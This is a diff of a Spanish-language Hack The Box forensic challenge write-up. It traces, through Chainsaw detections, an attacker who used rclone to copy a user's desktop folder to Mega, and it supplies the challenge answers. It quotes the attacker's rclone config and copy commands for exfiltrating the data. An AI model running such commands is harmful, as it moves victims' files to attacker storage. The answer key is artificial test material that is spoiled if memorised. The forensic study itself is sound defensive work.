@@ -127,35 +127,35 @@ Si observamos los detalles encontrados por la herramienta `Chainsaw`, podemos ve
 ```
 rclone.exe config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1sU3EjhoKQw0rEoQqHyI
 ```
-  `Respuesta: majmeret@protonmail.com`
+- `Respuesta: majmeret@protonmail.com`
 
 2. ¿Cuál es la contraseña del atacante utilizada para el proceso de exfiltración?
 En el comando anterior, también se puede observar esta respuesta:
 
-  `Respuesta: FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1sU3EjhoKQw0rEoQqHyI`
+- `Respuesta: FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1sU3EjhoKQw0rEoQqHyI`
 
 3. ¿Cuál es el proveedor de almacenamiento en la nube que utiliza el atacante?
 Esta respuesta la deduje por descarte, en un principio intenté encontrar alguna URL u otra pista que indicara el proveedor de nube, pero en realidad es tan simple como observar que en el comando anterior se menciona el servicio de Mega.
 
-  `Respuesta: mega`
+- `Respuesta: mega`
 
 4. ¿Cuál es el ID del proceso utilizado por los atacantes para configurar su herramienta?
 Al observar los detalles de las dos detecciones encontradas por Chainsaw, podemos identificar que la primera detección corresponde a la configuración y la segunda detección corresponde a la exfiltración. Por lo tanto, el ID de proceso de la configuración es 3820.
 
-  `Respuesta: 3820`
+- `Respuesta: 3820`
 
 5. ¿Cuál es el nombre de la carpeta que exfiltro el atacante? proporcionar la ruta completa.
 Para responder a esta pregunta, debemos examinar el detalle de la segunda detección, que corresponde al proceso de exfiltración. En este caso, se ha ejecutado el siguiente comando a través de PowerShell:
 ```
 "C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe" copy C:\Users\Wade\Desktop\Relic_location\ remote:exfiltration -v
 ```
-  `Respuesta: C:\Users\Wade\Desktop\Relic_location`
+- `Respuesta: C:\Users\Wade\Desktop\Relic_location`
 
 
 6. ¿Cuál es el nombre de la carpeta a la que el atacante extrajo los archivos?
 En el comando anterior, podemos observar que el destino es `remote:exfiltration`, lo que indica que el nombre de la carpeta es `exfiltration.`
 
-  `Respuesta: exfiltration`
+- `Respuesta: exfiltration`
 
 Luego de responder estas seis simples preguntas, el contenedor Docker de HTB nos proporcionará la flag.}
 
